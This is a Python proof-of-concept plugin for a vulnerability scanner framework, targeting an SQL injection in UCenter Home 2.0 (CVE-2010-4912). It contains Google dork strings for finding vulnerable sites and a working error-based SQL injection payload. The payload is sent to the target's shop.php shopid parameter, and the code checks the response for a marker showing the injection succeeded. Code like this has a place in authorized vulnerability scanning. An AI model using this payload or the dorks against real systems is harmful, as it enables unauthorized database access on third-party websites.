# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time

class Vuln(ABVuln):
    vuln_id = 'UCenter_0001' # 平台漏洞编号，留空
    name = 'UCenter Home 2.0 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = ' 2010-09-13'  # 漏洞公布时间
    desc = '''
        Script HomePage : http://u.discuz.net/
        Dork : Powered by UCenter inurl:shop.php?ac=view
        Dork 2 : inurl:shop.php?ac=view&shopid=
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/14997/'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = 'CVE-2010-4912'  # cve编号
    product = 'UCenter'  # 漏洞应用名称
    product_version = 'UCenter Home 2.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '87bcd08f-0d05-4979-8b24-a5487ba048c3'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = ("/shop.php?ac=view&shopid=253 AND (SELECT 4650 FROM(SELECT COUNT(*),"
                       "CONCAT(0x716b6a6271,(SELECT (CASE WHEN (4650=4650) THEN 1 ELSE 0 END)),"
                       "0x7178787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)")
            verify_url = self.target + payload

            content = requests.get(verify_url).content
            if 'qkjbq1qxxpq1' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
